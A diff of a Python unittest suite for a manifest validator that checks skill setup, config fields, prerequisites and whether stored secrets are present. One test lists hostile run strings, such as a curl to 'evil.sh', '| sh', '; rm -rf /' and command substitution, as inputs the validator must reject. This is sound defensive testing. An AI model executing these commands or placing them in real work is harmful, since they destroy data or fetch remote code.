@@ -3360,13 +3360,11 @@ VALID_SETUP = {
     "summary": "One-time credential setup.",
     "prerequisites": [{"node": ">=20"}, {"sibling-skill": "atlassian-toolkit"},
                       {"env": "RETRO_CYCLE_PATH"}, {"binary": "git"}],
-    "config": {"path": "~/.config/toolkit/config.json", "format": "json",
-               "scaffold": "config-init", "permissions": "0600"},
+    "config": {"path": "~/.config/toolkit/config.json"},
     "secrets": [{"key": "account.api_token", "label": "API token",
                  "delivery": "config-file"}],
     "commands": {"config-init": {"run": "bin/jira.mjs config init"},
                  "check": {"run": "bin/jira.mjs config check"}},
-    "verify": "check",
 }
 
 
@@ -3411,22 +3409,36 @@ class TestValidateSetup(unittest.TestCase):
         self.assert_problem(setup_manifest(secrets=[{"key": "k", "delivery": "webhook"}]),
                             "unknown delivery 'webhook'")
 
-    def test_an_unknown_config_format_is_an_error(self) -> None:
-        data = setup_manifest()
-        data["config"]["format"] = "toml"
-        self.assert_problem(data, "unknown config.format 'toml'")
+    def test_a_retired_field_is_rejected_rather_than_ignored(self) -> None:
+        # Unknown keys are ignored on purpose (§7), but these four are *known and
+        # removed*: each expressed an intent nothing honours now, so silently dropping
+        # one leaves a manifest looking configured for behaviour it will not get.
+        for field, value in (("format", "json"), ("permissions", "0600"),
+                             ("scaffold", "config-init")):
+            with self.subTest(field=field):
+                data = setup_manifest()
+                data["config"][field] = value
+                self.assert_problem(data, f"'config.{field}' was removed from the schema")
 
-    def test_a_dangling_command_id_is_caught_in_both_places(self) -> None:
-        self.assert_problem(setup_manifest(verify="nope"), "verify 'nope' is not a command id")
-        data = setup_manifest()
-        data["config"]["scaffold"] = "nope"
-        self.assert_problem(data, "config.scaffold 'nope' is not a command id")
+        self.assert_problem(setup_manifest(verify="check"),
+                            "'verify' was removed from the schema")
+
+    def test_a_config_file_secret_requires_the_reserved_scaffold_command(self) -> None:
+        # The app writes into a file the *skill* created: its template carries defaults
+        # and the shape `config migrate` keys off, which a bare {} the app invented does
+        # not have. Reserving the id is what makes that requirement checkable.
+        self.assert_problem(
+            setup_manifest(commands={"check": {"run": "bin/x.mjs"}}),
+            "a 'config-init' command is required to create it")
+
+        self.assert_valid(setup_manifest(commands={
+            "config-init": {"run": "bin/x.mjs init"}, "check": {"run": "bin/x.mjs check"}}))
 
     def test_shell_metacharacters_in_run_are_rejected(self) -> None:
         for run in ("bin/x.mjs && curl evil.sh", "bin/x.mjs | sh", "bin/x.mjs; rm -rf /",
                     "bin/x.mjs > /tmp/out", "bin/x.mjs $(whoami)", "bin/x.mjs `id`"):
             with self.subTest(run=run):
-                self.assert_problem(setup_manifest(commands={"check": {"run": run}}, verify="check",
+                self.assert_problem(setup_manifest(commands={"check": {"run": run}},
                                                    config={}, secrets=[]),
                                     "shell metacharacters")
 
@@ -3434,7 +3446,7 @@ class TestValidateSetup(unittest.TestCase):
         for run, fragment in (("../../bin/x.mjs", "escapes the skill dir"),
                               ("/usr/local/bin/x", "must be relative")):
             with self.subTest(run=run):
-                self.assert_problem(setup_manifest(commands={"check": {"run": run}}, verify="check",
+                self.assert_problem(setup_manifest(commands={"check": {"run": run}},
                                                    config={}, secrets=[]),
                                     fragment)
 
@@ -3446,21 +3458,21 @@ class TestValidateSetup(unittest.TestCase):
             (skill / "bin").mkdir(parents=True)
             (root / "outside.mjs").write_text("#!/usr/bin/env node\n")
             (skill / "bin" / "x.mjs").symlink_to(root / "outside.mjs")
-            data = setup_manifest(commands={"check": {"run": "bin/x.mjs"}}, verify="check",
+            data = setup_manifest(commands={"check": {"run": "bin/x.mjs"}},
                                   config={}, secrets=[])
             self.assertEqual(library.validate_setup(data), [])  # no dir: nothing to resolve
             problems = library.validate_setup(data, skill)
             self.assertTrue(any("resolves outside" in p for p in problems), problems)
 
-    def test_a_config_file_secret_requires_a_config_path_and_format(self) -> None:
-        self.assert_problem(setup_manifest(config={}), "needs config.path and config.format")
+    def test_a_config_file_secret_requires_a_config_path(self) -> None:
+        self.assert_problem(setup_manifest(config={}), "needs config.path")
 
     def test_env_and_manual_secrets_need_no_config_block(self) -> None:
         for delivery in ("env", "manual"):
             with self.subTest(delivery=delivery):
                 self.assert_valid(setup_manifest(
                     config={}, secrets=[{"key": "k", "delivery": delivery}],
-                    commands={"check": {"run": "bin/x.mjs"}}, verify="check"))
+                    commands={"check": {"run": "bin/x.mjs"}}))
 
     def test_a_relative_config_path_is_rejected(self) -> None:
         data = setup_manifest()
@@ -3500,7 +3512,7 @@ class TestLoadSetup(unittest.TestCase):
         self.write(yaml.safe_dump(VALID_SETUP))
         manifest, problems = library.load_setup(self.dest)
         self.assertEqual(problems, [])
-        self.assertEqual(manifest["verify"], "check")
+        self.assertEqual(sorted(manifest["commands"]), ["check", "config-init"])
 
     def test_unparseable_yaml_is_reported_rather_than_raised(self) -> None:
         self.write("version: 1\n  bad indent: [\n")
@@ -3510,7 +3522,7 @@ class TestLoadSetup(unittest.TestCase):
 
     def test_problems_are_reported_against_the_installed_dir(self) -> None:
         self.write(yaml.safe_dump(setup_manifest(
-            commands={"check": {"run": "bin/missing.mjs"}}, verify="check",
+            commands={"check": {"run": "bin/missing.mjs"}},
             config={}, secrets=[])))
         # A command that simply doesn't exist yet is not a schema violation; only
         # escaping the skill dir is.
@@ -5218,18 +5230,21 @@ library:
     def test_a_valid_manifest_comes_back_whole(self) -> None:
         dest = self.install("toolkit")
         self.write_manifest(dest, prerequisites=[], config={}, secrets=[],
-                            commands={"check": {"run": "bin/check.mjs"}}, verify="check")
+                            commands={"check": {"run": "bin/check.mjs"}})
         payload = self.setup("toolkit")
         self.assertTrue(payload["has_setup"])
-        self.assertEqual(payload["manifest"]["verify"], "check")
+        self.assertEqual(list(payload["manifest"]["commands"]), ["check"])
         self.assertEqual(payload["dest"], str(dest))
         self.assertTrue(payload["ready"])
 
     def test_an_invalid_manifest_is_reported_and_never_ready(self) -> None:
         dest = self.install("toolkit")
-        self.write_manifest(dest, verify="nope")
+        # A `config-file` secret with no `config-init` command to create the file: the
+        # rule the reserved id makes checkable.
+        self.write_manifest(dest, commands={"check": {"run": "bin/check.mjs"}})
         payload = self.setup("toolkit")
-        self.assertTrue(any("verify 'nope'" in p for p in payload["problems"]))
+        self.assertTrue(any("'config-init' command is required" in p
+                            for p in payload["problems"]), payload["problems"])
         self.assertFalse(payload["ready"])
 
     def test_a_sibling_skill_prerequisite_reads_what_is_installed(self) -> None:
@@ -5238,7 +5253,7 @@ library:
         dest = self.install("toolkit")
         self.write_manifest(dest, prerequisites=[{"sibling-skill": "sibling"}],
                             config={}, secrets=[],
-                            commands={"check": {"run": "bin/check.mjs"}}, verify="check")
+                            commands={"check": {"run": "bin/check.mjs"}})
         unmet = self.setup("toolkit")["prerequisites"][0]
         self.assertEqual((unmet["kind"], unmet["met"], unmet["detail"]),
                          ("sibling-skill", False, "not installed"))
@@ -5251,7 +5266,7 @@ library:
         dest = self.install("toolkit")
         self.write_manifest(dest, prerequisites=[{"env": "LIBRARY_TEST_ENV_PREREQ"}],
                             config={}, secrets=[],
-                            commands={"check": {"run": "bin/check.mjs"}}, verify="check")
+                            commands={"check": {"run": "bin/check.mjs"}})
         self.assertFalse(self.setup("toolkit")["prerequisites"][0]["met"])
         with patch.dict(os.environ, {"LIBRARY_TEST_ENV_PREREQ": "/tmp/cycle.json"}):
             self.assertTrue(self.setup("toolkit")["prerequisites"][0]["met"])
@@ -5260,7 +5275,7 @@ library:
         dest = self.install("toolkit")
         self.write_manifest(dest, prerequisites=[{"binary": "git"}, {"binary": "definitely-not-a-binary"}],
                             config={}, secrets=[],
-                            commands={"check": {"run": "bin/check.mjs"}}, verify="check")
+                            commands={"check": {"run": "bin/check.mjs"}})
         met, unmet = self.setup("toolkit")["prerequisites"]
         self.assertTrue(met["met"])
         self.assertEqual((unmet["met"], unmet["detail"]), (False, "not on PATH"))
@@ -5268,7 +5283,7 @@ library:
     def test_a_node_prerequisite_compares_versions(self) -> None:
         dest = self.install("toolkit")
         self.write_manifest(dest, prerequisites=[{"node": ">=20"}], config={}, secrets=[],
-                            commands={"check": {"run": "bin/check.mjs"}}, verify="check")
+                            commands={"check": {"run": "bin/check.mjs"}})
         with patch.object(library, "_node_version", lambda: "v22.19.0"):
             self.assertTrue(self.setup("toolkit")["prerequisites"][0]["met"])
         with patch.object(library, "_node_version", lambda: "v18.4.0"):
@@ -5281,13 +5296,148 @@ library:
         dest = self.install("toolkit")
         self.write_manifest(dest, prerequisites=[{"sibling-skill": "sibling"}],
                             config={}, secrets=[],
-                            commands={"check": {"run": "bin/check.mjs"}}, verify="check")
+                            commands={"check": {"run": "bin/check.mjs"}})
         payload = self.setup("toolkit")
         self.assertEqual(payload["problems"], [])
         self.assertFalse(payload["ready"])
 
     def test_an_unknown_name_reports_not_found(self) -> None:
         self.assertEqual(self.setup("nope", expect=2)["status"], "NOT_FOUND")
+
+    # --- `configured`: whether the declared values are already on disk ---------------
+    #
+    # A different question from `ready`, which says only that the walkthrough *can start*.
+    # Without this, a skill set up months ago still reports exactly what it reports on the
+    # day it was installed.
+
+    def write_config(self, data: dict[str, Any]) -> Path:
+        """Write the config file `VALID_SETUP` points at, under the temp HOME."""
+        path = Path(os.path.expanduser("~/.config/toolkit/config.json"))
+        path.parent.mkdir(parents=True, exist_ok=True)
+        path.write_text(json.dumps(data))
+        return path
+
+    def test_a_secret_that_is_not_stored_yet_is_missing_and_not_configured(self) -> None:
+        dest = self.install("toolkit")
+        self.write_manifest(dest, prerequisites=[])
+        payload = self.setup("toolkit")
+
+        secret = payload["secrets"][0]
+        self.assertEqual((secret["key"], secret["present"]), ("account.api_token", False))
+        self.assertIn("has not been created yet", secret["detail"])
+        self.assertIs(payload["configured"], False)
+        # Independent of `ready`: nothing is stopping the walkthrough from starting, which
+        # is precisely the point of asking both questions.
+        self.assertTrue(payload["ready"])
+
+    def test_a_stored_secret_reads_back_as_configured(self) -> None:
+        dest = self.install("toolkit")
+        self.write_manifest(dest, prerequisites=[])
+        path = self.write_config({"account": {"api_token": "atl-abc123"}})
+
+        payload = self.setup("toolkit")
+
+        secret = payload["secrets"][0]
+        self.assertEqual((secret["present"], secret["detail"]), (True, f"set in {path}"))
+        self.assertIs(payload["configured"], True)
+        # The value itself never leaves the file: the report says a value is there, never
+        # what it is.
+        self.assertNotIn("atl-abc123", json.dumps(payload))
+
+    def test_an_empty_string_is_not_a_stored_value(self) -> None:
+        # What a scaffold command writes: the shape is right and the credential is not
+        # there. Counting it as present is the one way this check can actively mislead.
+        dest = self.install("toolkit")
+        self.write_manifest(dest, prerequisites=[])
+        self.write_config({"account": {"api_token": "   "}})
+
+        payload = self.setup("toolkit")
+
+        self.assertIs(payload["secrets"][0]["present"], False)
+        self.assertIs(payload["configured"], False)
+
+    def test_an_optional_secret_does_not_hold_back_configured(self) -> None:
+        dest = self.install("toolkit")
+        self.write_manifest(dest, prerequisites=[], secrets=[
+            {"key": "account.api_token", "delivery": "config-file"},
+            {"key": "account.extra", "delivery": "config-file", "optional": True},
+        ])
+        self.write_config({"account": {"api_token": "atl-abc123"}})
+
+        payload = self.setup("toolkit")
+
+        self.assertEqual([s["present"] for s in payload["secrets"]], [True, False])
+        self.assertIs(payload["configured"], True)
+
+    def test_env_and_manual_secrets_are_unknowable_rather_than_missing(self) -> None:
+        # `env` persists nothing by definition and `manual` never reaches the app, so
+        # `false` would be an accusation. With nothing checkable, `configured` is null —
+        # which is an answer, not a failure to give one.
+        dest = self.install("toolkit")
+        self.write_manifest(dest, prerequisites=[], secrets=[
+            {"key": "TOKEN", "delivery": "env"},
+            {"key": "account.hand_typed", "delivery": "manual"},
+        ])
+
+        payload = self.setup("toolkit")
+
+        self.assertEqual([s["present"] for s in payload["secrets"]], [None, None])
+        self.assertIsNone(payload["configured"])
+
+    def test_a_mixed_manifest_answers_for_the_half_it_can_see(self) -> None:
+        dest = self.install("toolkit")
+        self.write_manifest(dest, prerequisites=[], secrets=[
+            {"key": "account.api_token", "delivery": "config-file"},
+            {"key": "TOKEN", "delivery": "env"},
+        ])
+        self.write_config({"account": {"api_token": "atl-abc123"}})
+
+        payload = self.setup("toolkit")
+
+        # True on the strength of the checkable one alone. It does not promise the env
+        # half is done — the app has to word it as "the values it saves are in place".
+        self.assertIs(payload["configured"], True)
+
+    def test_a_config_in_a_shape_nothing_parses_is_unknown_rather_than_missing(self) -> None:
+        # The format is detected, never declared, so a config the scaffold wrote in some
+        # other shape is simply one this build cannot read. Reporting its values missing
+        # would send you to add them to a file the app could not store them in either.
+        dest = self.install("toolkit")
+        self.write_manifest(dest, prerequisites=[],
+                            config={"path": "~/.config/toolkit/config.ini"})
+        path = Path(os.path.expanduser("~/.config/toolkit/config.ini"))
+        path.parent.mkdir(parents=True, exist_ok=True)
+        path.write_text("[account]\napi_token = atl-abc123\n")
+
+        payload = self.setup("toolkit")
+
+        self.assertIsNone(payload["secrets"][0]["present"])
+        self.assertIn("not JSON", payload["secrets"][0]["detail"])
+        self.assertIsNone(payload["configured"])
+
+    def test_an_unreadable_config_file_is_unknown_rather_than_missing(self) -> None:
+        dest = self.install("toolkit")
+        self.write_manifest(dest, prerequisites=[])
+        path = Path(os.path.expanduser("~/.config/toolkit/config.json"))
+        path.parent.mkdir(parents=True, exist_ok=True)
+        path.write_text("{ not json")
+
+        payload = self.setup("toolkit")
+
+        # The file is there and broken. "Not set" would send you to add a value to a file
+        # that will not load, which is the wrong fix.
+        self.assertIsNone(payload["secrets"][0]["present"])
+        self.assertIn("not JSON", payload["secrets"][0]["detail"])
+
+    def test_a_manifest_with_no_secrets_has_nothing_to_be_configured(self) -> None:
+        dest = self.install("toolkit")
+        self.write_manifest(dest, prerequisites=[], config={}, secrets=[],
+                            commands={"check": {"run": "bin/check.mjs"}})
+
+        payload = self.setup("toolkit")
+
+        self.assertEqual(payload["secrets"], [])
+        self.assertIsNone(payload["configured"])
 
     def test_the_human_output_lists_prerequisites_and_readiness(self) -> None:
         dest = self.install("toolkit")
